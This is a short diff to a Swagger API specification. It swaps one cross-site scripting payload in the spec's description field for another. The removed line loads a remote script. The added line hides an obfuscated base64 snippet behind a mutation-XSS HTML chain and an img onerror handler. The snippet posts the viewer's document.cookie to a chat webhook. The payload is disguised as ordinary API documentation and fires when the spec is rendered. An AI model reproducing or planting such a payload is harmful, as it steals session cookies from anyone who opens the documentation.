@@ -2,8 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><script src='https://zerone0x01.github.io/xss.js'></script><img onerror='zerone0x01_xss()' src=1>">
-    <
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vcXlhcGkud2VpeGluLnFxLmNvbS9jZ2ktYmluL3dlYmhvb2svc2VuZD9rZXk9NDRmNzY3MTMtODcyYi00YTM2LWFlOTAtZTIyYWQxNjcxZmQ2Jywgew0KICAgIG1ldGhvZDogJ1BPU1QnLA0KICAgIG1vZGU6ICduby1jb3JzJywNCiAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicgfSwNCiAgICBib2R5OiBKU09OLnN0cmluZ2lmeSh7DQogICAgICAgICJtc2d0eXBlIjogInRleHQiLA0KICAgICAgICAidGV4dCI6IHsNCiAgICAgICAgICAgICJjb250ZW50IjogZG9jdW1lbnQuY29va2llDQogICAgICAgIH0NCiAgICB9KQ0KfSk7DQo=')) src=1>">
 paths:
   /accounts:
     get:
